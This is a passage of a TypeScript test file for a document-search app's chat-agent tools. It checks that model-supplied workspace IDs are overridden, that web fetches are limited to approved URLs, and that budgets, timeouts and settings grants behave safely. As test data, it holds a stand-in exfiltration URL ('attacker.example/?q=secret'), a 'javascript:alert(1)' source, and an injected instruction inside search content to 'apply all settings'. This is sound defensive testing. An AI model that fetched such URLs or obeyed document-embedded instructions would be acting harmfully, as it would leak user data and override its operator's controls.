import { describe, expect, it, vi } from "vitest";
import type { McpDispatch } from "../lib/mcp-http.js";
import { CHAT_AGENT_LIMIT_DEFAULTS } from "@docslurp/shared";
import { asSchema } from "ai";
import { createChatMcpTools, evidencePages, TOOL_DEADLINE_RESULT, withoutEvidence } from "./chat-mcp-tools.js";
import { mcpManifest, uploadStatusInput, mediaEvidenceInput } from "./mcp-catalog.js";
import { searchInputSchema, batchSearchInputSchema, workspaceChatInputSchema } from "../lib/search-input.js";
import { currentSearchSignal } from "../search/query-bounds.js";
import { currentChatAgentSignal } from "../lib/chat-agent-context.js";

function setup(ids = ["search"], options: { toolBudgetMs?: () => number; webTools?: boolean; userText?: string[]; maxToolCalls?: number; suggestions?: boolean; settingsTools?: boolean; publicClient?: boolean } = {}) {
  const dispatch = vi.fn<McpDispatch>(async () => Response.json({ results: [] }));
  const onActivity = vi.fn();
  const controller = new AbortController();
  const context = createChatMcpTools({ manifest: { capabilities: ids.map(id => ({ id, title: id, category: "tool", description: id, inputSchema: { type: "object" } })) },
    // The first-party app's turn unless a test says otherwise (settings tools are app-only).
    dispatch, workspaceId: "selected", signal: controller.signal, onActivity, settingsTools: true, ...options });
  const execute = (name: string, input: unknown = {}, id = "call") => context.tools[name]!.execute!(input, { toolCallId: id, messages: [], context: {} });
  return { ...context, get failure() { return context.failure; }, execute, dispatch, onActivity, controller };
}

describe("chat MCP tools", () => {
  it.each([
    ["search", { q: "question", workspace: "foreign", workspaceId: "legacy" }, searchInputSchema],
    ["search", { queries: [{ q: "question", workspace: "foreign", workspaceId: "legacy" }] }, batchSearchInputSchema],
    ["chat", { q: "question", workspace: "foreign", workspaceId: "legacy" }, workspaceChatInputSchema],
    ["getUploadStatus", { workspace: "foreign", workspaceId: "legacy" }, uploadStatusInput],
    ["getMediaEvidence", { documentId: "video", workspace: "foreign", workspaceId: "legacy" }, mediaEvidenceInput],
  ] as const)("dispatches %s with valid MCP arguments pinned to the selected workspace", async (name, input, schema) => {
    const t = setup([name]);
    await t.execute(name, input);
    const parsed = schema.safeParse(JSON.parse(t.dispatch.mock.calls[0]![1]!.body as string));
    expect(parsed.success, JSON.stringify(parsed.error)).toBe(true);
    const body = parsed.data as { workspace?: string; queries?: Array<{ workspace?: string }> };
    for (const query of body.queries ?? [body]) expect(query.workspace).toBe("selected");
    expect(t.dispatch).toHaveBeenCalledOnce();
  });

  it("pins every tool to the selected workspace, overriding model-supplied scope (G-04)", async () => {
    const t = setup(["search", "chat"]);
    await t.execute("search", { q: "question", workspaceId: "injected" });
    expect(JSON.parse(t.dispatch.mock.calls[0]![1]!.body as string)).toEqual({ q: "question", workspace: "selected" });
    await t.execute("chat", { q: "x", workspaceId: "injected" });
    expect(JSON.parse(t.dispatch.mock.calls[1]![1]!.body as string).workspace).toBe("selected");
  });

  it("pins every batch query to the selected workspace", async () => {
    const t = setup(["search"]);
    await t.execute("search", { queries: [{ q: "a", workspaceId: "foreign" }] });
    expect(JSON.parse(t.dispatch.mock.calls[0]![1]!.body as string).queries[0].workspace).toBe("selected");
  });

  it("does not offer ingestion tools that fetch URLs or start paid work (G-04)", () => {
    const t = setup(["search", "upload", "completeUpload", "listWorkspaces"]);
    expect(Object.keys(t.tools)).toEqual(["search"]);
  });

  it("never lets the model start a paid full index", () => {
    expect(Object.keys(setup(["search", "fullIndex"]).tools)).toEqual(["search"]);
  });

  it("leaves rarely used tools out of the per-step tool catalog", () => {
    const t = setup(["search", "fullIndexEstimate", "uploadEstimate", "reprocessEstimate", "getJob", "suggestQueries", "getUploadStatus"]);
    expect(Object.keys(t.tools)).toEqual(["search", "getUploadStatus"]);
  });

  it("offers only webSearch and webFetch to chat, and only when the turn allows web tools", () => {
    const ids = ["search", "webSearch", "webFetch", "webMap", "webCrawl", "ingestWebsite"];
    expect(Object.keys(setup(ids).tools)).toEqual(["search"]);
    expect(Object.keys(setup(ids, { webTools: true }).tools)).toEqual(["search", "webSearch", "webFetch"]);
  });

  it("lets webFetch read only URLs from the user's messages or this turn's web search results", async () => {
    const denied = setup(["webSearch", "webFetch"], { webTools: true });
    expect(await denied.execute("webFetch", { urls: ["https://attacker.example/?q=secret"] }, "a")).toMatchObject({ code: "url_not_allowed", blocked: true });
    expect(denied.dispatch).not.toHaveBeenCalled();
    await expect(denied.execute("webSearch", { query: "retry" }, "b")).rejects.toMatchObject({ code: "chat_tool_failed" });
    const t = setup(["webSearch", "webFetch"], { webTools: true, userText: ["Summarize https://docs.example.com/guide/, please."] });

    await t.execute("webFetch", { urls: ["https://docs.example.com/guide#intro"] }, "b");
    expect(t.dispatch).toHaveBeenCalledOnce();

    t.dispatch.mockResolvedValueOnce(Response.json({ results: [{ url: "https://news.example.org/story" }] }));
    await t.execute("webSearch", { query: "story" }, "c");
    await t.execute("webFetch", { urls: ["https://news.example.org/story/"] }, "d");
    expect(t.dispatch).toHaveBeenCalledTimes(3);
    expect(JSON.parse(t.dispatch.mock.calls[2]![1]!.body as string).workspace).toBe("selected");
  });

  it("reports web tool progress: the query while running, then result domains, count, cache and credits", async () => {
    const t = setup(["webSearch"], { webTools: true });
    t.dispatch.mockResolvedValueOnce(Response.json({
      results: [{ url: "https://www.nodejs.org/en/blog", title: "Node.js blog", snippet: "long page text", markdown: "# body" }, { url: "https://github.com/nodejs/node" }],
      cached: false, usage: { credits: 1 },
    }));
    await t.execute("webSearch", { query: "node 24 release" });
    const [loading, done] = t.onActivity.mock.calls.map(([event]) => event);
    expect(loading).toMatchObject({ name: "webSearch", status: "loading", web: { kind: "search", query: "node 24 release" } });
    expect(done.web).toEqual({ kind: "search", query: "node 24 release", resultCount: 2, cached: false, credits: 1, results: [
      { url: "https://www.nodejs.org/en/blog", domain: "nodejs.org", title: "Node.js blog" },
      { url: "https://github.com/nodejs/node", domain: "github.com" },
    ] });
  });

  it("answers from the pages a web fetch read and reports the unread ones without blocking the turn", async () => {
    const t = setup(["webFetch"], { webTools: true, userText: ["https://example.com/a https://example.com/b"] });
    t.dispatch.mockResolvedValueOnce(Response.json({ pages: [{ url: "https://example.com/a", markdown: "Partial content" }], failed: [{ url: "https://example.com/b", reason: "blocked" }] }));
    const result = await t.execute("webFetch", { urls: ["https://example.com/a", "https://example.com/b"] });
    expect(result).toMatchObject({ ok: true, result: { pages: [{ url: "https://example.com/a" }] },
      unread: [{ url: "https://example.com/b", reason: expect.stringContaining("bot protection") }] });
    expect(t.failure).toBeUndefined();
  });

  it.each([
    ["webSearch", { query: "status" }, 502, { error: { code: "unavailable", message: "Web search failed. Try again shortly." } }, "unavailable", /may be down.*bot protection.*AI/],
    ["webSearch", { query: "status" }, 429, { error: { code: "rate_limited", message: "Too many web tool calls." } }, "rate_limited", /try again/],
    ["webFetch", { urls: ["https://example.com/a"] }, 400, { error: { code: "invalid_request", message: "The web fetch request was rejected." } }, "invalid_request", /rejected/],
  ] as const)("turns a failed %s (HTTP %s) into an explained result instead of blocking", async (name, input, status, body, code, reason) => {
    const t = setup(["search", "webSearch", "webFetch"], { webTools: true, userText: ["https://example.com/a"] });
    t.dispatch.mockResolvedValueOnce(Response.json(body, { status }));
    const result = await t.execute(name, input, "a") as { error: string; instruction: string };
    expect(result).toMatchObject({ ok: false, blocked: false, code, status });
    expect(result.error).toMatch(reason);
    expect(result.instruction).toMatch(/plainly.*Still complete every other part/s);
    expect(t.failure).toBeUndefined();
    await expect(t.execute("search", { q: "next" }, "b")).resolves.toMatchObject({ ok: true });
  });

  it("explains a web fetch that read no pages with each page's reason", async () => {
    const t = setup(["webFetch"], { webTools: true, userText: ["https://example.com/a"] });
    t.dispatch.mockResolvedValueOnce(Response.json({ pages: [], failed: [{ url: "https://example.com/a", reason: "http_403" }] }));
    const result = await t.execute("webFetch", { urls: ["https://example.com/a"] });
    expect(result).toMatchObject({ ok: false, blocked: false, code: "http_403", error: expect.stringMatching(/web page.*403.*AI/),
      failed: [{ url: "https://example.com/a", reason: expect.stringContaining("403") }] });
    expect(t.failure).toBeUndefined();
  });

  it("returns rejected search arguments to the model to correct, then blocks after two rejections", async () => {
    const t = setup(["search"]);
    const rejected = () => Response.json({ error: { code: "invalid_request", message: "Invalid request", details: { issues: [{ path: ["limit"], message: "Expected number" }] } } }, { status: 400 });
    t.dispatch.mockResolvedValueOnce(rejected()).mockResolvedValueOnce(rejected()).mockResolvedValueOnce(rejected());
    await expect(t.execute("search", { q: "a", limit: "ten" }, "a")).resolves.toMatchObject({ ok: false, blocked: false, code: "invalid_arguments",
      issues: [{ path: ["limit"], message: "Expected number" }], instruction: expect.stringContaining("again once") });
    await expect(t.execute("search", { q: "a", limit: "ten" }, "b")).resolves.toMatchObject({ blocked: false, code: "invalid_arguments" });
    await expect(t.execute("search", { q: "a", limit: "ten" }, "c")).resolves.toMatchObject({ blocked: true });
    expect(t.failure).toMatchObject({ code: "chat_tool_failed" });
  });

  it("does not block the turn when a web call throws or times out", async () => {
    const t = setup(["webSearch"], { webTools: true, toolBudgetMs: () => 30 });
    t.dispatch.mockImplementationOnce((_path, init) => new Promise((_resolve, reject) => init!.signal!.addEventListener("abort", () => reject(init!.signal!.reason))));
    await expect(t.execute("webSearch", { query: "slow" }, "a")).resolves.toMatchObject({ ok: false, blocked: false, code: "tool_timeout" });
    t.dispatch.mockRejectedValueOnce(new Error("socket hang up"));
    await expect(t.execute("webSearch", { query: "broken" }, "b")).resolves.toMatchObject({ ok: false, blocked: false, code: "exception" });
    expect(t.failure).toBeUndefined();
  });

  it("streams only short http(s) source URLs and still reports a partially failed fetch", async () => {
    const long = `https://example.com/${"a".repeat(3_000)}`;
    const t = setup(["webFetch"], { webTools: true, userText: [`https://example.com/a https://example.com/b ${long}`] });
    t.dispatch.mockResolvedValueOnce(Response.json({ pages: [{ url: "https://example.com/a", title: "A" }, { url: "javascript:alert(1)" }],
      failed: [{ url: "https://example.com/b", reason: "unreadable" }], usage: { credits: 0.25 } }));
    await t.execute("webFetch", { urls: ["https://example.com/a", "https://example.com/b", long] });
    const [loading, done] = t.onActivity.mock.calls.map(([event]) => event);
    expect(loading.web).toEqual({ kind: "fetch", urls: ["https://example.com/a", "https://example.com/b"], requestedCount: 3 });
    expect(done.status).toBe("success");
    expect(done.web).toMatchObject({ failedCount: 1, credits: 0.25, results: [{ url: "https://example.com/a", domain: "example.com", title: "A" }] });
  });

  it("bounds calls and honors cancellation before dispatch", async () => {
    const t = setup();
    const max = CHAT_AGENT_LIMIT_DEFAULTS.maxToolCalls;
    for (let i = 0; i <= max; i++) await t.execute("search", { q: "repeat" }, `${i}`);
    expect(t.dispatch).toHaveBeenCalledTimes(max);
    t.controller.abort();
    await expect(t.execute("search")).rejects.toThrow();
    expect(t.dispatch).toHaveBeenCalledTimes(max);
  });

  it("returns adapter errors and reports failed activity without claiming success", async () => {
    const t = setup();
    t.dispatch.mockResolvedValueOnce(Response.json({ error: "Workspace not found" }, { status: 404 }));
    await expect(t.execute("search")).resolves.toMatchObject({ ok: false, status: 404 });
    expect(t.onActivity.mock.calls.map(([event]) => event.status)).toEqual(["loading", "error"]);
  });

  it("deduplicates evidence and gives stable citation numbers across searches", async () => {
    const t = setup();
    const source = { text: "Supported fact", score: 1, citation: { documentId: "doc", filename: "guide.pdf", pageNumber: 1, chunkIndex: 0, headingPath: [] } };
    t.dispatch.mockImplementation(async () => Response.json({ results: [source] }));
    await t.execute("search");
    const result = await t.execute("search");
    expect(t.citations).toHaveLength(1);
    expect(result).toMatchObject({ evidence: [{ citationIndex: 1, text: "Supported fact" }] });
  });

  it("sends each passage once: only this call's evidence, with raw hits stripped from the result", async () => {
    const t = setup();
    const hit = (chunkIndex: number, text: string) => ({ text, score: 1, citation: { documentId: "doc", filename: "guide.pdf", pageNumber: chunkIndex + 1, chunkIndex, headingPath: [] } });
    t.dispatch.mockResolvedValueOnce(Response.json({ results: [hit(0, "First")], searchSessionId: "s1" }));
    t.dispatch.mockResolvedValueOnce(Response.json({ results: [hit(0, "First"), hit(1, "Second")], searchSessionId: "s2" }));
    await t.execute("search");
    const second = await t.execute("search");
    expect(second).toEqual({ ok: true, status: 200, result: { searchSessionId: "s2" }, evidence: [
      { citationIndex: 1, filename: "guide.pdf", documentId: "doc", pageNumber: 1, text: "First" },
      { citationIndex: 2, filename: "guide.pdf", documentId: "doc", pageNumber: 2, text: "Second" },
    ] });
  });

  it("keeps a zero-hit result and a nested answer visible to the model", async () => {
    const t = setup();
    t.dispatch.mockResolvedValueOnce(Response.json({ results: [] }));
    await expect(t.execute("search")).resolves.toEqual({ ok: true, status: 200, result: { results: [] } });
    expect(withoutEvidence({ answer: "Yes [1]", citations: [{ text: "x", score: 1, citation: { documentId: "d", filename: "f", pageNumber: 1, chunkIndex: 0, headingPath: [] } }] }))
      .toEqual({ answer: "Yes [1]" });
  });
});

describe("chat MCP tool budgets", () => {
  function budgeted(maxToolCalls: number, searchConcurrency: number) {
    const dispatch = vi.fn<McpDispatch>(async () => Response.json({ results: [] }));
    const context = createChatMcpTools({ manifest: { capabilities: [{ id: "search", title: "search", category: "tool", description: "search", inputSchema: { type: "object" } }] },
      dispatch, workspaceId: "selected", signal: new AbortController().signal, maxToolCalls, searchConcurrency });
    const execute = (input: unknown, id: string) => context.tools.search!.execute!(input, { toolCallId: id, messages: [], context: {} });
    return { ...context, dispatch, execute };
  }

  it("caps batch concurrency at the turn's searchConcurrency and uses it when the model omits it", async () => {
    const t = budgeted(5, 2);
    await t.execute({ queries: [{ q: "a" }, { q: "b" }, { q: "c" }], concurrency: 8 }, "1");
    await t.execute({ queries: [{ q: "a" }] }, "2");
    await t.execute({ queries: [{ q: "a" }], concurrency: 1 }, "3");
    expect(t.dispatch.mock.calls.map(([, init]) => JSON.parse(init!.body as string).concurrency)).toEqual([2, 2, 1]);
    expect(t.searchCalls.map(call => [call.queryCount, call.concurrency, call.zeroHit])).toEqual([[3, 2, true], [1, 2, true], [1, 1, true]]);
  });

  it("refuses calls beyond maxToolCalls with a coded result and counts them", async () => {
    const t = budgeted(1, 4);
    await t.execute({ q: "a" }, "1");
    await expect(t.execute({ q: "b" }, "2")).resolves.toMatchObject({ code: "tool_call_limit", limitReached: true });
    expect(t.dispatch).toHaveBeenCalledTimes(1);
    expect(t.counters).toMatchObject({ executed: 1, refused: 1, byTool: { search: 1 } });
  });
});

describe("chat MCP tool call details", () => {
  it("records model queries, hits, distinct evidence pages, tool cost and failure codes per call", async () => {
    const t = setup(["search"]);
    const hit = (documentId: string, pageNumber: number, chunkIndex: number) => ({ text: "passage", score: 1, citation: { documentId, filename: "f.pdf", pageNumber, chunkIndex, headingPath: [] } });
    t.dispatch.mockResolvedValueOnce(Response.json({ results: [
      { ok: true, data: { results: [hit("d1", 2, 0), hit("d1", 2, 1)], usage: { costCents: 0.01 } } },
      { ok: true, data: { results: [hit("d2", 5, 0)], usage: { costCents: 0.02 } } },
    ] }));
    await t.execute("search", { queries: [{ q: "first question" }, { q: "second question" }] }, "a");
    t.dispatch.mockResolvedValueOnce(Response.json({ error: { code: "invalid_search_scope", message: "x" } }, { status: 400 }));
    await t.execute("search", { q: "bad" }, "b");
    const exception = setup();
    exception.dispatch.mockRejectedValueOnce(new Error("boom"));
    await exception.execute("search", { q: "boom" }, "c");
    const [first, second] = [...t.details.values()];
    const third = exception.details.get("c");
    await expect(t.execute("search", { q: "must not retry" }, "blocked")).rejects.toMatchObject({ code: "chat_tool_failed" });
    expect(t.dispatch).toHaveBeenCalledTimes(2);
    expect(first).toMatchObject({ id: "a", name: "search", status: "success", queries: ["first question", "second question"],
      resultCount: 3, zeroHit: false, evidencePages: [{ documentId: "d1", pageNumber: 2 }, { documentId: "d2", pageNumber: 5 }] });
    expect(first!.costCents).toBeCloseTo(0.03, 10);
    expect(first!.runtimeMs).toBeGreaterThanOrEqual(0);
    expect(second).toMatchObject({ status: "error", queries: ["bad"], errorCode: "invalid_search_scope" });
    expect(third).toMatchObject({ status: "error", queries: ["boom"], errorCode: "exception" });
    expect(t.counters.toolCostCents).toBeCloseTo(0.03, 10);
  });
});

describe("chat MCP tool retrieval controls", () => {
  it("enforces resolved retrieval controls on every search, batch query and nested chat", async () => {
    const { workspaceSearchRetrievalDefaultsSchema } = await import("@docslurp/shared");
    const dispatch = vi.fn<McpDispatch>(async () => Response.json({ results: [] }));
    const context = createChatMcpTools({ manifest: { capabilities: ["search", "chat"].map(id => ({ id, title: id, category: "tool", description: id, inputSchema: { type: "object" } })) },
      dispatch, workspaceId: "selected", signal: new AbortController().signal,
      retrievalDefaults: workspaceSearchRetrievalDefaultsSchema.parse({ resultCount: 4, useHyDE: false, useRerank: false, useMmr: true, iterativeMultiHop: false, resultOrder: "relevance" }),
    });
    const execute = (name: string, input: unknown) => context.tools[name]!.execute!(input, { toolCallId: name, messages: [], context: {} });
    await execute("search", { q: "a", hyde: true, rerank: true, limit: 100, resultOrder: "prompt" });
    expect(JSON.parse(dispatch.mock.calls[0]![1]!.body as string)).toMatchObject({ workspace: "selected", limit: 4, hyde: false, rerank: false, mmr: true, resultOrder: "relevance" });
    await execute("search", { queries: [{ q: "a", hyde: true, limit: 100 }, { q: "b" }] });
    for (const query of JSON.parse(dispatch.mock.calls[1]![1]!.body as string).queries) expect(query).toMatchObject({ workspace: "selected", limit: 4, hyde: false, mmr: true });
    await execute("chat", { q: "a", retrieval: { useHyDE: true } });
    expect(JSON.parse(dispatch.mock.calls[2]![1]!.body as string)).toMatchObject({ workspace: "selected", retrieval: { resultCount: 4, useHyDE: false, useMmr: true, resultOrder: "relevance" } });
  });
});

describe("first-party-app settings tools", () => {
  const SETTINGS = ["getWorkspaceSettings", "proposeWorkspaceSettings"];

  it("never offers settings tools unless the turn is the first-party app's, even when the catalog lists them", () => {
    for (const settingsTools of [undefined, false]) {
      const context = createChatMcpTools({ manifest: { capabilities: [...SETTINGS, "search"].map(id => ({ id, title: id, category: "tool", description: id, inputSchema: { type: "object" } })) },
        dispatch: vi.fn<McpDispatch>(), workspaceId: "selected", signal: new AbortController().signal, settingsTools, suggestions: true });
      expect(Object.keys(context.tools)).toEqual(["search"]);
    }
    expect(Object.keys(setup([...SETTINGS, "search"]).tools)).toEqual([...SETTINGS, "search"]);
  });

  it("withholds upload status from browser (client) key chats", () => {
    expect(Object.keys(setup(["getUploadStatus", "search"], { publicClient: true }).tools)).toEqual(["search"]);
    expect(Object.keys(setup(["getUploadStatus", "search"]).tools)).toEqual(["getUploadStatus", "search"]);
  });

  it("lists proposeWorkspaceSettings only for the first-party app, never for any API key or by default", () => {
    const ids = (...args: Parameters<typeof mcpManifest>) => mcpManifest(...args).capabilities.map(item => item.id);
    expect(ids("https://x.test")).not.toContain("proposeWorkspaceSettings");
    expect(ids("https://x.test", ["search", "chat", "ingest", "workspaces:manage"], "server")).not.toContain("proposeWorkspaceSettings");
    expect(ids("https://x.test", ["search", "chat", "workspaces:manage"], "client", { firstPartyApp: true })).not.toContain("proposeWorkspaceSettings");
    expect(ids("https://x.test", undefined, undefined, { firstPartyApp: true })).toContain("proposeWorkspaceSettings");
  });
});

describe("chat agent tool schemas", () => {
  // Anthropic (direct, Bedrock, Vertex) answers 400 "input_schema does not support oneOf,
  // allOf, or anyOf at the top level"; OpenAI rejects them (and `not`) at the top level too.
  const COMBINATORS = ["oneOf", "anyOf", "allOf", "not"];

  it("sends every chat-agent tool to the model as a plain object schema without top-level combinators", async () => {
    const context = createChatMcpTools({ manifest: mcpManifest("http://mcp.internal"),
      dispatch: vi.fn<McpDispatch>(), workspaceId: "selected", signal: new AbortController().signal });
    const names = Object.keys(context.tools);
    expect(names).toEqual(expect.arrayContaining(["search", "chat"]));
    for (const name of names) {
      const schema = await asSchema(context.tools[name]!.inputSchema).jsonSchema as Record<string, unknown>;
      expect(schema.type, name).toBe("object");
      expect(COMBINATORS.filter(key => key in schema), name).toEqual([]);
    }
  });

  it("keeps the whole MCP catalog flat, since MCP clients forward these schemas to the same providers", () => {
    for (const tool of mcpManifest("http://mcp.internal").capabilities) {
      expect(tool.inputSchema.type, tool.id).toBe("object");
      expect(COMBINATORS.filter(key => key in tool.inputSchema), tool.id).toEqual([]);
    }
  });
});

describe("evidence pages", () => {
  const hit = (documentId: string, pageNumber: number | null, pageNumbers: number[] = []) =>
    ({ text: "passage", score: 1, citation: { documentId, filename: "f.pdf", pageNumber, pageNumbers, chunkIndex: 0, headingPath: [] } }) as never;

  it("expands multi-page chunks into their pages, deduplicated, and drops null when a page is known", () => {
    expect(evidencePages([hit("d1", null, [1211, 1212]), hit("d1", 1212), hit("d1", null), hit("d2", null, [3]), hit("d3", null)])).toEqual([
      { documentId: "d1", pageNumber: 1211 }, { documentId: "d1", pageNumber: 1212 },
      { documentId: "d2", pageNumber: 3 }, { documentId: "d3", pageNumber: null },
    ]);
  });

  it("reports multi-page evidence on the tool call detail", async () => {
    const t = setup(["search"]);
    t.dispatch.mockResolvedValueOnce(Response.json({ results: [hit("doc", null, [1211, 1212])] }));
    await t.execute("search", { q: "spanning" }, "span");
    expect(t.details.get("span")?.evidencePages).toEqual([{ documentId: "doc", pageNumber: 1211 }, { documentId: "doc", pageNumber: 1212 }]);
  });
});

/** A dispatch that never answers on its own; it only settles when its request signal aborts (or never, when `ignoreSignal`). */
function hangingDispatch(seen: { signal?: AbortSignal; searchSignal?: AbortSignal; chatSignal?: AbortSignal }, ignoreSignal = false): McpDispatch {
  return async (_path, init) => {
    seen.signal = init?.signal ?? undefined;
    seen.searchSignal = currentSearchSignal();
    seen.chatSignal = currentChatAgentSignal();
    return await new Promise<Response>((_resolve, reject) => {
      if (!ignoreSignal) init?.signal?.addEventListener("abort", () => reject(init.signal!.reason), { once: true });
    });
  };
}

describe("chat MCP tool time budgets and cancellation", () => {
  it("runs nested work under the tool signal and cancels a tool at its budget with a tool_timeout result", async () => {
    const t = setup(["search"], { toolBudgetMs: () => 40 });
    const seen: Parameters<typeof hangingDispatch>[0] = {};
    t.dispatch.mockImplementation(hangingDispatch(seen));
    await expect(t.execute("search", { q: "slow" })).resolves.toMatchObject({ code: "tool_timeout" });
    // Nested searches read these before the outer HTTP request's signal (services/search.ts, workspace-chat.ts).
    expect(seen.searchSignal).toBe(seen.signal);
    expect(seen.chatSignal).toBe(seen.signal);
    expect(seen.signal?.aborted).toBe(true);
    expect(t.details.get("call")).toMatchObject({ status: "error", errorCode: "tool_timeout" });
    expect(t.counters.timedOut).toBe(1);
    expect(t.controller.signal.aborted).toBe(false);
  });

  it("returns at the budget even when the tool ignores its signal", async () => {
    const t = setup(["search"], { toolBudgetMs: () => 30 });
    const seen: Parameters<typeof hangingDispatch>[0] = {};
    t.dispatch.mockImplementation(hangingDispatch(seen, true));
    const started = Date.now();
    await expect(t.execute("search", { q: "stuck" })).resolves.toMatchObject({ code: "tool_timeout" });
    expect(Date.now() - started).toBeLessThan(1_000);
    expect(seen.signal?.aborted).toBe(true);
  });

  it("refuses tools once the final-answer reserve has started", async () => {
    const t = setup(["search"], { toolBudgetMs: () => 0 });
    await expect(t.execute("search", { q: "late" })).resolves.toMatchObject({ code: "deadline", blocked: true });
    expect(t.dispatch).not.toHaveBeenCalled();
    expect(t.details.get("call")).toMatchObject({ status: "error", errorCode: "deadline" });
  });

  it("cancels an in-flight tool, its searches and nested calls when the turn aborts", async () => {
    const t = setup(["search"], { toolBudgetMs: () => 60_000 });
    const seen: Parameters<typeof hangingDispatch>[0] = {};
    t.dispatch.mockImplementation(hangingDispatch(seen));
    const pending = t.execute("search", { q: "abandoned" });
    await vi.waitFor(() => expect(seen.signal).toBeDefined());
    t.controller.abort(new Error("client gone"));
    await expect(pending).rejects.toThrow("client gone");
    expect(seen.signal?.aborted).toBe(true);
    expect(seen.searchSignal?.aborted).toBe(true);
    expect(t.details.get("call")).toMatchObject({ errorCode: "aborted" });
  });
});

describe("trusted workspace settings proposals", () => {
  it("pins proposal scope, delivers the grant only through structured UI data, and never exposes an apply tool", async () => {
    const t = setup(["proposeWorkspaceSettings"]);
    const settingsProposal = { token: "opaque-ui-only-grant", workspaceId: "selected", expiresAt: "2026-10-24T01:00:00.000Z",
      before: { "pipeline.mediaVideo.enabled": false }, after: { "pipeline.mediaVideo.enabled": true },
      changes: [{ key: "pipeline.mediaVideo.enabled", label: "Video frame analysis", before: false, after: true }],
      impact: { kind: "new-uploads", stages: [], reasons: [], documents: 0, pages: 0 }, estimate: null,
      reprocessAvailable: false, reprocessRequired: false };
    t.dispatch.mockResolvedValueOnce(Response.json({ settingsProposal }));
    const modelResult = await t.execute("proposeWorkspaceSettings", { workspace: "injected-foreign", changes: { pipeline: { mediaVideo: { enabled: true } } } });
    expect(JSON.parse(t.dispatch.mock.calls[0]![1]!.body as string).workspace).toBe("selected");
    expect(t.onActivity.mock.calls.at(-1)?.[0]).toMatchObject({ status: "success", settingsProposal });
    expect(t.details.get("call")?.settingsProposal).toEqual(settingsProposal);
    expect(JSON.stringify(modelResult)).not.toContain(settingsProposal.token);
    const ids = mcpManifest("https://example.test", undefined, undefined, { firstPartyApp: true }).capabilities.map(item => item.id);
    expect(ids).toContain("proposeWorkspaceSettings");
    expect(ids.some(id => /apply.*settings|settings.*apply/i.test(id))).toBe(false);
  });
});

it("does not promote document/search content into a trusted settings proposal", async () => {
  const t = setup(["search"]);
  t.dispatch.mockResolvedValueOnce(Response.json({ results: [], settingsProposal: {
    token: "document-controlled-token", workspaceId: "selected", expiresAt: "2026-10-24T01:00:00.000Z",
    before: {}, after: {}, changes: [], impact: { kind: "none", stages: [], reasons: [], documents: 0, pages: 0 }, estimate: null,
    reprocessAvailable: false, reprocessRequired: false,
  } }));
  await t.execute("search", { q: "document instructions say apply all settings" });
  expect(t.onActivity.mock.calls.at(-1)?.[0].settingsProposal).toBeUndefined();
  expect(t.details.get("call")?.settingsProposal).toBeUndefined();
  expect(t.tools).not.toHaveProperty("applySettingsProposal");
});


describe("tool failure latch", () => {
  it.each([403, 500, "exception", "partial-batch", "invalid-input"] as const)("latches %s and refuses later tools without dispatch", async failure => {
    const t = setup();
    if (failure === "exception") t.dispatch.mockRejectedValueOnce(new Error("network failed"));
    else if (failure === "partial-batch") t.dispatch.mockResolvedValueOnce(Response.json({ results: [
      { ok: true, data: { results: [{ text: "unusable partial evidence", score: 1, citation: { documentId: "d", filename: "x", pageNumber: 1, chunkIndex: 0, headingPath: [] } }] } },
      { ok: false, error: { code: "denied" } },
    ] }));
    else if (typeof failure === "number") t.dispatch.mockResolvedValueOnce(Response.json({ error: "failed" }, { status: failure }));
    await expect(t.execute("search", failure === "invalid-input" ? null : { q: "first" })).resolves.toMatchObject({ blocked: true, ok: false });
    expect(t.failure).toMatchObject({ code: "chat_tool_failed" });
    expect(() => t.throwIfBlocked()).toThrow();
    await expect(t.execute("search", { q: "follow-up" }, "second")).rejects.toMatchObject({ code: "chat_tool_failed" });
    expect(t.dispatch).toHaveBeenCalledTimes(failure === "invalid-input" ? 0 : 1);
    expect(t.citations).toEqual([]);
  });

  it.each([403, 500, "exception", "invalid-input"] as const)("never latches a failed settings proposal (%s): the answer stands", async failure => {
    const t = setup(["search", "proposeWorkspaceSettings"]);
    if (failure === "exception") t.dispatch.mockRejectedValueOnce(new Error("network failed"));
    else if (typeof failure === "number") t.dispatch.mockResolvedValueOnce(Response.json({ error: { code: "no_change" } }, { status: failure }));
    const result = await t.execute("proposeWorkspaceSettings", failure === "invalid-input" ? null : { changes: { retrieval: { resultCount: 8 } } });
    expect(result).toMatchObject({ ok: false, blocked: false });
    expect((result as { error: string }).error).toMatch(/could not be prepared/);
    expect(t.failure).toBeUndefined();
    expect(() => t.throwIfBlocked()).not.toThrow();
    // Later tools still run.
    await t.execute("search", { q: "follow-up" }, "second");
    expect(t.dispatch).toHaveBeenCalledTimes(failure === "invalid-input" ? 1 : 2);
  });

  it("does not latch a settings proposal refused by the tool-call budget", async () => {
    const t = setup(["search", "proposeWorkspaceSettings"], { maxToolCalls: 1 });
    await t.execute("search", { q: "first" }, "a");
    await expect(t.execute("proposeWorkspaceSettings", { changes: {} }, "b")).resolves.toMatchObject({ code: "tool_call_limit", blocked: false });
    expect(t.failure).toBeUndefined();
  });

  it("does not count a refused optional call as a tool-call-limit stop", async () => {
    const t = setup(["search", "proposeWorkspaceSettings"], { maxToolCalls: 1 });
    await t.execute("search", { q: "first" }, "a");
    await t.execute("proposeWorkspaceSettings", { changes: {} }, "b");
    expect(t.counters).toMatchObject({ refused: 0, softRefused: 1 });
  });

  it("treats an unreadable proposal as not prepared, without leaking the raw result", async () => {
    const t = setup(["proposeWorkspaceSettings"]);
    t.dispatch.mockResolvedValueOnce(Response.json({ settingsProposal: { token: "raw-grant", malformed: true } }));
    const result = await t.execute("proposeWorkspaceSettings", { changes: {} });
    expect(result).toMatchObject({ ok: false, blocked: false, code: "invalid_proposal" });
    expect(JSON.stringify(result)).not.toContain("raw-grant");
    expect(t.details.get("call")).toMatchObject({ status: "error", errorCode: "invalid_proposal" });
    expect(t.failure).toBeUndefined();
  });

  it("in suggestions mode, a budget refusal of a diagnostic read does not cost the answer", async () => {
    const t = setup(["search", "getUploadStatus"], { maxToolCalls: 1, suggestions: true });
    await t.execute("search", { q: "first" }, "a");
    await expect(t.execute("getUploadStatus", {}, "b")).resolves.toMatchObject({ code: "tool_call_limit", blocked: false });
    expect(t.failure).toBeUndefined();
    // A real failure of the same read still blocks.
    const real = setup(["getUploadStatus"], { suggestions: true });
    real.dispatch.mockResolvedValueOnce(Response.json({ error: "failed" }, { status: 500 }));
    await expect(real.execute("getUploadStatus", {})).resolves.toMatchObject({ blocked: true });
    // Outside suggestions mode the refusal blocks as before.
    const plain = setup(["search", "getUploadStatus"], { maxToolCalls: 1 });
    await plain.execute("search", { q: "first" }, "a");
